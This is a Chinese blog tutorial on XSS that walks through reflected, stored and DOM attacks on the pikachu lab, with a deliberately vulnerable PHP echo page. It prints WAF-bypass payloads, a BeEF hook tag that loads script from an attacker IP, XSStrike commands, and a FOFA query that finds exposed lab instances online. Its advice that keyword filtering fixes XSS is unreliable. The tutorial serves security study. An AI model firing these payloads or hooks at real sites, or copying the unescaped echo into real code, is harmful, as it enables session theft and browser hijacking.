---
title: XSS漏洞
date: 2026-06-08 11:00:00
cover: https://img.jasmine-iris.top/posts/XSS漏洞/cover.webp
categories:
  - Web安全
  - XSS
tags:
  - XSS
description: 跨站脚本攻击（XSS）的类型与危害——反射型、存储型、DOM型，以及常见的防御与绕过方法
---

# 一、XSS简介与危害
## 1. 定义
跨站脚本攻击XSS（Cross Site Scripting），为避免与层叠样式表（CSS）缩写混淆，故缩写为XSS。  
恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。

## 2. 危害
1. 盗取各类用户账号，如机器登录帐号、用户网银帐号、各类管理员帐号
2. 控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力
3. 盗窃企业重要的具有商业价值的资料
4. 非法转账
5. 强制发送电子邮件
6. 网站挂马
7. 控制受害者机器向其它网站发起攻击（重定向语句）
8. 窃取cookie的**sessionid**，冒充登录

---

# 二、反射型与存储型XSS
XSS攻击可分为三类：反射型、存储型、DOM型，易混淆的是反射和DOM类型。

## 1. 反射型
### 1.1 反射型流程
1. 黑客诱导用户点击恶意URL：`xxxxxxx.com/?xxx=<script>恶意代码</script>`
2. 客户端向URL对应的服务器发出请求
3. 服务器将恶意代码从URL中取出，拼接在HTML中返回给浏览器
4. 客户端解析代码，恶意代码随之执行

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS/1786517008069_sv6dpr.png)

### 1.2 案例
#### 1.2.1 编写代码
把 php 文件放在 phpstudy 的 www 目录下

```php
<?php
$xss = $_GET['x'];
echo $xss;
?>
```

**访问**

```plain
?x=1
?x=<script>alert(1)</script>
?x=<script>alert('已入侵你后端系统')</script>
?x=<h1 style='font-size: 10vw;'>你已被入侵啦,遭到破坏！</script></h1>
```



#### 1.2.2 fofa搜索命令
```plain
"pikachu" && country="CN" && title="Get the pikachu"
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS/1786517011221_2dz6l2.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS/1786517013670_zt9p0m.png)

进入 pikachu 靶场



如果 fofa 访问失败，可以自己搭建pikachu靶场**。**

**pikachu靶场：反射型XSS 练习**

1.  反射型xss

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS/1786517015740_z84amw.png)

先输入 1 测试

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS/1786517016739_focn1k.png)

输入恶意代码

```plain
<script>alert(1)</script>
```

**方法一：**

直接在 URL 中修改 message 的值。因为根据测试结果来看，我们输入的 1 实际上是 message 的值。

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS/1786517018340_myzbt7.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS/1786517019816_5snalb.png)

****

**方法二：**

直接在输入框里输入恶意代码，但是我们发现会有长度限制：

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS/1786517021696_hw6p7w.png)

F12，发现可以输入的最大长度是 20，那我们就可以把它的数值改大一点。

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS/1786517023448_abpxyn.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS/1786517025550_lu6lpv.png)

注意：改完之后不要刷新，不然又会恢复 20。

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS/1786517027005_x7kd9c.png)

总结：输入框长度限制可通过**修改URL**或**F12改前端代码**绕过

---

## 2. 存储型
攻击数据存储在服务器，攻击持续生效，危害比反射型更大。

以 pikachu 靶场为例：

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS/1786517028787_bd5c9h.png)

传入一个恶意代码

```plain
<h1 style='font-size: 10vw;'>你已被入侵啦,遭到破坏！</script></h1>
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS/1786517030496_zxn31y.png)

只要刷新这个页面，就会重复出现这句话。<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS/1786517032105_oks742.png)

---

## 3. DOM型
### 3.1 流程
1. 黑客诱导用户点击恶意URL

```plain
#' onclick="alert(1)"
```

2. 客户端直接执行攻击代码，无需与服务器交互
3. 攻击纯粹发生在客户端

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS/1786517034570_ksax7p.png)

以 pikachu 靶场为例：

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS/1786517037987_ofkmuo.png)

先输入 1 测试一下

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS/1786517039123_sgci3r.png)

传入一个恶意代码：

```plain
#' onclick="alert(1)"
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS/1786517041541_kyfbno.png)

点击之后：

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS/1786517043561_7yucda.png)

---

# 三、BeEF-XSS工具使用
具体使用：[beef-xss详细教程-CSDN博客](https://blog.csdn.net/qq_53517370/article/details/128992559?spm=1001.2101.3001.6650.3&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EElasticSearch%7ERate-3-128992559-blog-106067842.235%5Ev43%5Epc_blog_bottom_relevance_base7&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EElasticSearch%7ERate-3-128992559-blog-106067842.235%5Ev43%5Epc_blog_bottom_relevance_base7&utm_relevant_index=6)

BeEF是Kali自带的XSS利用工具，基于Ruby开发。

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS/1786517045231_n71xtm.png)

### 1. 核心信息
+ Web UI：`http://127.0.0.1:3000/ui/panel`
+ Hook代码：`<script src="http://<IP>:3000/hook.js"></script>`

### 2. 攻击流程
1.  启动 BeEF

```bash
beef-xss-start
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS/1786517046948_i0f8fm.png)

账号：beef** ，**我设置的密码是 kali

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS/1786517048484_gfk7s5.png)

2. 黑客（Kali）IP 放入 Hook 代码中

```bash
# 查看 IP
ifconfig
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS/1786517050689_172gzd.png)

```plain
<script src="http://192.168.23.131:3000/hook.js"></script>
```

3. 注入Hook代码到表单提交入库

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS/1786517052820_4yaz59.png)

4. 受害者访问页面被Hook，BeEF控制台可控制浏览器（如重定向）

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS/1786517054615_m4mpd0.png)

---

# 四、XSS的绕过技巧与修复
## 1. 未开启WAF
直接URL注入：

```plain
http://localhost/1.php?x=%3Cscript%3Ealert(1)%3C/script%3E
```

## 2. 开启WAF（安全狗）
请求被拦截，提示“带有不合法参数”。

### 2.1 手工绕过--标签语法替换
+ **audio标签**

```plain
<audio src=x onerror=alert(47)>
<audio src=x onerror=prompt(1);>
<audio src=1 href=1 onerror=javascript:alert(1)>
```

+ **video标签**

```plain
<video src=x onerror=prompt(1);>
<video src=x onerror=alert(48)>
```

+ **button标签**

```plain
<button onfocus=alert(1) autofocus>
<button/onclick=alert(1)>xss</button>

```

### 2.2 加密算法
```plain
<details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
# 97,108,101,114,116,40,49,41 = alert(1)
```

## 3. XSStrike工具
可识别并绕过WAF的XSS扫描工具，项目地址：[https://github.com/s0md3v/XSStrike](https://github.com/s0md3v/XSStrike)

### 3.1 常用参数XSStrike 
+ `-h, --help`  
显示帮助信息
+ `-u, --url`  
指定目标 URL
+ `--data`  
POST 方式提交内容
+ `-v, --verbose`  
详细输出
+ `-f, --file`  
加载自定义 payload 字典
+ `-t, --threads`  
定义线程数
+ `-l, --level`  
爬行深度
+ `-t, --encode`  
定义 payload 编码方式
+ `--json`  
将 POST 数据视为 JSON
+ `--path`  
测试 URL 路径组件
+ `--seeds`  
从文件中测试、抓取 URL
+ `--fuzzer`  
测试过滤器和 Web 应用程序防火墙（WAF）
+ `--update`  
更新工具
+ `--timeout`  
设置超时时间
+ `--params`  
指定参数
+ `--crawl`  
爬行目标网站
+ `--proxy`  
使用代理
+ `--blind`  
盲测试
+ `--skip`  
跳过确认提示
+ `--skip-dom`  
跳过 DOM 扫描
+ `--headers`  
提供 HTTP 标头
+ `-d, --delay`  
设置请求延迟

### 3.2 使用示例
```bash
# 安装依赖
pip install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/
# Fuzz测试
python xsstrike.py -u "http://localhost/1.php?x=1" --fuzzer
# 直接探测
python xsstrike.py -u "http://localhost/1.php?x=1"
```

### 3.3 优化测试页面
```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<title>欢迎来到</title>
</head>
<body>
<h1 align=center>欢迎</h1>
<?php
$xss = $_GET['x'];
echo $xss;
?>
<center>测试XSS</center>
</body>
</html>
```

# 五、总结
## Q1：XSS 是什么？
跨站脚本攻击

## Q2：XSS的产生原因是什么？
后端开发没有对用户传入的参数做严格的限制或过滤，直接输出了用户传入的参数，导致用户传入的参数被浏览器当作 javascript 执行。

## Q3：XSS有什么危害？
1、获取浏览器的其他信息

2、窃取浏览器的敏感信息

3、劫持浏览器（用  BeEF ，了解常用功能，比如：重定向redirect、）

## Q4：怎么修复 XSS漏洞？
过滤常见关键字

## Q5：怎么绕 WAF？
挨个使用 audio、script、video、button标签、加密算法，最后使用产生随机码。

